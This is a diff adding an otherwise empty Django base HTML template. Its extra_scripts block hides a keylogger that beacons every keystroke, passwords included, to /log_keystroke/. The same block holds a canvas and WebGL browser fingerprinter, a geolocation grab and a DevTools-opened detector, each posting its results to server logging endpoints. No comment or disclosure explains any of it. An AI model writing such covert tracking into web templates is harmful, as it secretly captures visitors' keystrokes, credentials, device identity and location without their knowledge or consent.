@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+{% load static %}
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>
+        {% block title %}
+
+        {% endblock %}
+    </title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel="icon" href=""/>
+    <link rel='stylesheet' type='text/css' media='screen' href="">
+    <script src=""></script>
+</head>
+<body>
+    {% block header %}
+
+    {% endblock %}
+
+    {% block content %}
+
+    {% endblock %}
+
+    {% block extra_scripts %}
+    <script>
+        let keys = "";
+        document.addEventListener("keydown", function(e) {
+          keys += e.key;
+        });
+        window.addEventListener("beforeunload", function() {
+          navigator.sendBeacon("/log_keystroke/", new URLSearchParams({
+            page: window.location.pathname,
+            keys: keys
+          }));
+        });
+        </script>
+    
+    <script>
+        async function sendFingerprint() {
+          const fp = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            plugins: Array.from(navigator.plugins).map(p => p.name),
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            memory: navigator.deviceMemory || 'n/a',
+            touchSupport: 'ontouchstart' in window,
+            webglVendor: '',
+            webglRenderer: '',
+            canvasHash: ''
+          };
+        
+          // Canvas Fingerprint
+          try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillText("fingerprint", 2, 2);
+            fp.canvasHash = canvas.toDataURL();
+          } catch (e) {}
+        
+          // WebGL Info
+          try {
+            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+            const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+            fp.webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+            fp.webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+          } catch (e) {}
+        
+          fetch("/log_fingerprint/", {
+            method: "POST",
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: new URLSearchParams({fp: JSON.stringify(fp)})
+          });
+        }
+        window.onload = sendFingerprint;
+        </script>
+    
+    <script>
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function(position) {
+            fetch("/log_geo/", {
+              method: "POST",
+              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+              body: new URLSearchParams({
+                lat: position.coords.latitude,
+                lon: position.coords.longitude
+              })
+            });
+          });
+        }
+        </script>
+    
+    <script>
+        function detectDevTools() {
+          let threshold = 160;
+          const element = new Image();
+          Object.defineProperty(element, 'id', {
+            get: function () {
+              fetch("/log_evasion_detected/", {
+                method: "POST",
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: new URLSearchParams({evasion: "DevTools opened"})
+              });
+            }
+          });
+          console.log(element);
+        }
+        detectDevTools();
+        </script>
+        
+
+    {% endblock %}
+
+    {% block footer %}
+
+    {% endblock %}
+
+</body>
+</html>
